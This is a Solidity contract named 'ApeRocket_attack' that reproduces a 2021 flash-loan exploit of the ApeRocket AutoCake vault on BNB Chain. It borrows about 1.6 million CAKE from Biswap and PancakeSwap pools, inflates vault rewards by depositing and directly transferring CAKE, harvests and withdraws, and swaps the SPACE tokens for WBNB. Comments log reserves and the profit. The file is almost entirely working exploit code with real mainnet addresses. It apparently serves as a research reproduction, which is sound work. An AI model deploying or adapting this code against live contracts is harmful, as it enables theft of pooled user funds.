// SPDX-License-Identifier: AGPL-3.0-or-later
// The ABI encoder is necessary, but older Solidity versions should work
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;

// Transaction hash 0x701a308fba23f9b328d2cdb6c7b245f6c3063a510e0d5bc21d2477c9084f93e0
// Timestamp 2021-07-14 04:29:27(UTC)
// Block number 9139708
// From 0x53d07afa123702469ab6cf286e9ff7033a7eff65
// To 0x3523b46a2ccd8b43b2141ab0ccc38f7b013b771c

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IPancakePair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

interface IBSwapFactory {
    function INIT_CODE_HASH (  ) external view returns ( bytes32 );
    function allPairs ( uint256 ) external view returns ( address );
    function allPairsLength (  ) external view returns ( uint256 );
    function createPair ( address tokenA, address tokenB ) external returns ( address pair );
    function feeTo (  ) external view returns ( address );
    function feeToSetter (  ) external view returns ( address );
    function getPair ( address, address ) external view returns ( address );
    function setDevFee ( address _pair, uint8 _devFee ) external;
    function setFeeTo ( address _feeTo ) external;
    function setFeeToSetter ( address _feeToSetter ) external;
    function setSwapFee ( address _pair, uint32 _swapFee ) external;
}


interface IBiswapPair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function swapFee() external view returns (uint32);
    function devFee() external view returns (uint32);
    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
    function setSwapFee(uint32) external;
    function setDevFee(uint32) external;
}

interface IBiswapERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
}

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IAutoCake {
    function ROUTER (  ) external view returns ( address );
    function SPACE (  ) external view returns ( address );
    function balance (  ) external view returns ( uint256 );
    function balanceOf ( address account ) external view returns ( uint256 );
    function deposit ( uint256 _amount ) external;
    function depositAll (  ) external;
    function depositedAt ( address account ) external view returns ( uint256 );
    function disableWhitelist ( bool disable ) external;
    function earned ( address account ) external view returns ( uint256 );
    function getReward (  ) external;
    function harvest (  ) external;
    function initialize ( address _minter ) external;
    function isWhitelist ( address _address ) external view returns ( bool );
    function keeper (  ) external view returns ( address );
    function lastPauseTime (  ) external view returns ( uint256 );
    function minter (  ) external view returns ( address );
    function owner (  ) external view returns ( address );
    function paused (  ) external view returns ( bool );
    function pid (  ) external view returns ( uint256 );
    function poolType (  ) external view returns ( uint8 );
    function priceShare (  ) external view returns ( uint256 );
    function principalOf ( address account ) external view returns ( uint256 );
    function recoverToken ( address token, uint256 amount ) external;
    function renounceOwnership (  ) external;
    function rewardsToken (  ) external view returns ( address );
    function setKeeper ( address _keeper ) external;
    function setMinter ( address newMinter ) external;
    function setPaused ( bool _paused ) external;
    function setSpaceChef ( address newSpaceChef ) external;
    function setWhitelist ( address _address, bool _on ) external;
    function sharesOf ( address account ) external view returns ( uint256 );
    function spaceChef (  ) external view returns ( address );
    function stakingToken (  ) external view returns ( address );
    function totalShares (  ) external view returns ( uint256 );
    function totalSupply (  ) external view returns ( uint256 );
    function transferOwnership ( address newOwner ) external;
    function withdraw ( uint256 shares ) external;
    function withdrawAll (  ) external;
    function withdrawUnderlying ( uint256 _amount ) external;
    function withdrawableBalanceOf ( address account ) external view returns ( uint256 );
}

interface IApeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IApeRouter {
    function swapExactTokensForTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external returns (uint[] memory amounts) ;
}

interface IPancakeRouter02 {
      function WETH (  ) external view returns ( address );
      function addLiquidity ( address tokenA, address tokenB, uint256 amountADesired, uint256 amountBDesired, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline ) external returns ( uint256 amountA, uint256 amountB, uint256 liquidity );
      function addLiquidityETH ( address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline ) external returns ( uint256 amountToken, uint256 amountETH, uint256 liquidity );
      function factory (  ) external view returns ( address );
      function getAmountIn ( uint256 amountOut, uint256 reserveIn, uint256 reserveOut ) external pure returns ( uint256 amountIn );
      function getAmountOut ( uint256 amountIn, uint256 reserveIn, uint256 reserveOut ) external pure returns ( uint256 amountOut );
      function getAmountsIn ( uint256 amountOut, address[] calldata path ) external view returns ( uint256[] memory amounts );
      function getAmountsOut ( uint256 amountIn, address[] calldata path ) external view returns ( uint256[] memory amounts );
      function quote ( uint256 amountA, uint256 reserveA, uint256 reserveB ) external pure returns ( uint256 amountB );
      function removeLiquidity ( address tokenA, address tokenB, uint256 liquidity, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline ) external returns ( uint256 amountA, uint256 amountB );
      function removeLiquidityETH ( address token, uint256 liquidity, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline ) external returns ( uint256 amountToken, uint256 amountETH );
      function removeLiquidityETHSupportingFeeOnTransferTokens ( address token, uint256 liquidity, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline ) external returns ( uint256 amountETH );
      function removeLiquidityETHWithPermit ( address token, uint256 liquidity, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns ( uint256 amountToken, uint256 amountETH );
      function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens ( address token, uint256 liquidity, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns ( uint256 amountETH );
      function removeLiquidityWithPermit ( address tokenA, address tokenB, uint256 liquidity, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns ( uint256 amountA, uint256 amountB );
      function swapETHForExactTokens ( uint256 amountOut, address[] calldata path, address to, uint256 deadline ) external returns ( uint256[] memory amounts );
      function swapExactETHForTokens ( uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external returns ( uint256[] memory amounts );
      function swapExactETHForTokensSupportingFeeOnTransferTokens ( uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external;
      function swapExactTokensForETH ( uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external returns ( uint256[] memory amounts );
      function swapExactTokensForETHSupportingFeeOnTransferTokens ( uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external;
      function swapExactTokensForTokens ( uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external returns ( uint256[] memory amounts );
      function swapExactTokensForTokensSupportingFeeOnTransferTokens ( uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external;
      function swapTokensForExactETH ( uint256 amountOut, uint256 amountInMax, address[] calldata path, address to, uint256 deadline ) external returns ( uint256[] memory amounts );
      function swapTokensForExactTokens ( uint256 amountOut, uint256 amountInMax, address[] calldata path, address to, uint256 deadline ) external returns ( uint256[] memory amounts );
}


interface IApePair {
        function DOMAIN_SEPARATOR (  ) external view returns ( bytes32 );
        function MINIMUM_LIQUIDITY (  ) external view returns ( uint256 );
        function PERMIT_TYPEHASH (  ) external view returns ( bytes32 );
        function allowance ( address, address ) external view returns ( uint256 );
        function approve ( address spender, uint256 value ) external returns ( bool );
        function balanceOf ( address ) external view returns ( uint256 );
        function burn ( address to ) external returns ( uint256 amount0, uint256 amount1 );
        function decimals (  ) external view returns ( uint8 );
        function factory (  ) external view returns ( address );
        function getReserves (  ) external view returns ( uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast );
        function initialize ( address _token0, address _token1 ) external;
        function kLast (  ) external view returns ( uint256 );
        function mint ( address to ) external returns ( uint256 liquidity );
        function name (  ) external view returns ( string memory );
        function nonces ( address ) external view returns ( uint256 );
        function permit ( address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s ) external;
        function price0CumulativeLast (  ) external view returns ( uint256 );
        function price1CumulativeLast (  ) external view returns ( uint256 );
        function skim ( address to ) external;
        function swap ( uint256 amount0Out, uint256 amount1Out, address to, bytes memory data ) external;
        function symbol (  ) external view returns ( string memory );
        function sync (  ) external;
        function token0 (  ) external view returns ( address );
        function token1 (  ) external view returns ( address );
        function totalSupply (  ) external view returns ( uint256 );
        function transfer ( address to, uint256 value ) external returns ( bool );
        function transferFrom ( address from, address to, uint256 value ) external returns ( bool );
}





contract ApeRocket_attack {
    address private EOA;
    address private BSwapFactoryAddress = 0x858E3312ed3A876947EA49d572A7C42DE08af7EE;
    address private WBNBAddress = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private CAKEAddress = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;
    address private PancakeSwapFactoryAddress = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address private BUSDAddress = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address private SyrupBarAddress = 0x009cF7bC57584b7998236eff51b98A168DceA9B0;
    address private AutoCakeAddress = 0x274B5B7868c848Ac690DC9b4011e9e7e29133700;
    address private SPACEAddress = 0xe486a69E432Fdc29622bF00315f6b34C99b45e80;
    address private ApeFactoryAddress = 0x0841BD0B734E4F5853f0dD8d7Ea041c241fb0Da6;
    address private ApeRouterAddress = 0xC0788A3aD43d79aa53B09c2EaCc313A787d1d607;
    address private ApeSwapFinanceLPAddress = 0xd0F82498051067E154d1dcd3d88fA95063949D7e;

    IBiswapERC20 CAKE = IBiswapERC20(CAKEAddress);
    IBEP20 SyrupBar = IBEP20(SyrupBarAddress);
    IBEP20 SPACE = IBEP20(SPACEAddress);
    IBEP20 WBNB = IBEP20(WBNBAddress);
    IAutoCake AutoCake =  IAutoCake(AutoCakeAddress);
    IApeRouter ApeRouter = IApeRouter(ApeRouterAddress);

    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";
    string str5 = "";
    string str6 = "";
    address[] ad = new address[](2);


    constructor() {
        CAKE.approve(AutoCakeAddress, 2 ** 256 - 1);
        SPACE.approve(ApeRouterAddress, 2 ** 256 - 1);

        EOA = msg.sender;
    }

    receive() external payable {}

    // Block number
    // loan amount: 355,600,879,692,227,584,859,481 CAKE from Biswap CAKE-WBNB pool
    //              1,259,459,212,464,459,000,252,436 CAKE from PancakeSwap’s CAKE-BUSD pool


    function attack() public {

        IBSwapFactory BSwapFactory = IBSwapFactory(BSwapFactoryAddress);
        address BiswapCAKE2WBNBPoolAddress = BSwapFactory.getPair(WBNBAddress, CAKEAddress);
        IBiswapPair BiswapPair = IBiswapPair(BiswapCAKE2WBNBPoolAddress);
        BiswapPair.sync();
        // (uint r0, uint r1, ) = BiswapPair.getReserves();
        // // CAKE: 355600 879692227584859482  ||  WBNB: 16310 176234922141610177

        // IApeFactory ApeFactory = IApeFactory(ApeFactoryAddress);
        // address ApePairWBNB2SPACEAddress = ApeFactory.getPair(WBNBAddress, SPACEAddress);
        // IApePair ApePair = IApePair(ApePairWBNB2SPACEAddress);
        // (r0, r1, ) = ApePair.getReserves();
        // // WBNB: 7231 559626213089567911  SPACE: 214100 971259847528247538

        // 355600879692227584859482
        BiswapPair.swap(355600 * 10 ** 18, 0, address(this), bytes("not empty"));
    }

    function BiswapCall(address, uint amount0, uint, bytes calldata) public {
        uint256 balance = CAKE.balanceOf(address(this));
        require(balance == amount0, "Flashswap amount mismatch");

        IPancakeFactory PancakeFactory = IPancakeFactory(PancakeSwapFactoryAddress);
        address PancakeSwapBUSD2CAKEAddress = PancakeFactory.getPair(BUSDAddress, CAKEAddress);
        IPancakePair PancakeSwapBUSD2CAKE = IPancakePair(PancakeSwapBUSD2CAKEAddress);
        PancakeSwapBUSD2CAKE.sync();

        // balance = CAKE.balanceOf(PancakeSwapBUSD2CAKEAddress);
        // 1259459212464459000252437
        PancakeSwapBUSD2CAKE.swap(1259400 * 10 ** 18, 0, address(this), bytes("not empty"));
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) public {

        // ----------------------------------- Now we have enough CAKE tokens of 1615000 --------------------------------------------------

        uint256 balance2 = SyrupBar.balanceOf(AutoCakeAddress); // AutoCake is the strategy contract of Aperocket
        // 2545716491201262796822
        // balance = AutoCake.balance();
        // 2545716491201262796822
        // They are the same!

// revert(uint2str(CAKE.balanceOf(address(this)))); // 1615000 000000000000000000
        uint balance = AutoCake.totalShares();
        // 2473279572094287272084
        // shares = deposited amount * totalShares / SyrupBar balance(autocake)

        // Action 1: Deposit to AutoCake: CAKE -> Shares    State: AutoCake
        //           State: AutoCake
        // Syrupbar of AutoCake: 2545716491201262796822 AutoCake total Shares: 2473279572094287272084 
        // Share of this: 0 Earning: 0 

// uint AmountIn = aa * 10 ** 3 * 10 ** 18; // aa = 509
str5 = AutoCakeSummary(); 


// action 1:
AutoCake.deposit(509143298240252559364400);  // x1
str6 = AutoCakeSummary();

// revert(uint2str(AutoCake.balanceOf(address(this)))); // 509143 326848178580576631
//revert(uint2str(CAKE.balanceOf(address(this)))); // 1105856 701759747440635600

        // Syrupbar of AutoCake: 511689044515356668366884 AutoCake total Shares: 497129193990951741688884 
        // Share of this: 494655 914418857454416800 Earning: 29635724225080260



        // Action 2: transfer AutoCake and Harvest:  CAKE -> SPACE, CAKE   State: AutoCake
        //           State: AutoCake

// AmountIn = bb * 10 ** 3 * 10 ** 18; // bb = 1105
        str5 = AutoCakeSummary();

balance = CAKE.balanceOf(address(this));  // 1105 856 701759747440635600
CAKE.transfer(AutoCakeAddress, balance); // x2

uint balance3 = CAKE.balanceOf(address(this));

// action 2:
AutoCake.harvest();

// action 3:
AutoCake.getReward();

// action 4:
AutoCake.withdrawAll();

        str6 = AutoCakeSummary();
        balance = SPACE.balanceOf( address(this) );

// revert(uint2str(AutoCake.balanceOf(address(this))));  // 0
//revert(uint2str(CAKE.balanceOf(address(this)))); // 1276 846 050641578190064038
//revert(uint2str(SPACE.balanceOf(address(this))));
        // SPACE got: 508813597706528690336402



        // Action 5: Swap Space for WBNB:  Space -> WBNB     State: ApeRouter
        //           State: ApeRouter
        // input: 508846 SPACE
        ad[0] = SPACEAddress;
        ad[1] = WBNBAddress;
        balance = SPACE.balanceOf(address(this));
        // 508840617331581615260254
        // get 508840617331581615260254 profit
        ApeRouter.swapExactTokensForTokens(balance, 1, ad, address(this), 16263233670 );
        // reserve_SPACE = 159302, reserve_WBNB = 22197
        // output: 16897 WBNB



        revert(ProfitSummary());
        // WBNB Profit: 16896 026804552796444811 
        // CAKE Cost: 338153 950917245835053387       1 CAKE = 4.587 * 10^(-2) WBNB       15511 WBNB
        // Approximately 1385 WBNB


    }

    function AutoCakeSummary() internal returns (string memory _uintAsString)  {
        uint SyrupBarbalance =  AutoCake.balance();
        uint totalShares = AutoCake.totalShares();
        uint thisShare = AutoCake.sharesOf(address(this));
        uint256 earn = AutoCake.earned(address(this));
        str1 = append("Syrupbar of AutoCake: ", uint2str(SyrupBarbalance));
        str2 = append("AutoCake total Shares: ", uint2str(totalShares));
        str3 = append("Share of this: ", uint2str(thisShare));
        str4 = append("Earning: ", uint2str(earn));
        return appendWithSpace(appendWithSpace(str1, str2), appendWithSpace(str3, str4));
    }



    function ProfitSummary() internal returns (string memory _uintAsString)  {
        uint WBNBProfit = WBNB.balanceOf(address(this));
        uint CAKECost =  1615000 * 10 ** 18 - CAKE.balanceOf(address(this));
        str1 = append("WBNB Profit: ", uint2str(WBNBProfit));
        str2 = append("CAKE Cost: ", uint2str(CAKECost));
        return appendWithSpace(str1, str2);
    }


    function uint2str(uint _i) internal returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }

    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }


    function toString(address account) internal pure returns(string memory) {
        return toString(abi.encodePacked(account));
    }

    function toString(bytes memory data) internal pure returns(string memory) {
        bytes memory alphabet = "0123456789abcdef";

        bytes memory str = new bytes(2 + data.length * 2);
        str[0] = "0";
        str[1] = "x";
        for (uint i = 0; i < data.length; i++) {
            str[2+i*2] = alphabet[uint(uint8(data[i] >> 4))];
            str[3+i*2] = alphabet[uint(uint8(data[i] & 0x0f))];
        }
        return string(str);
    }
}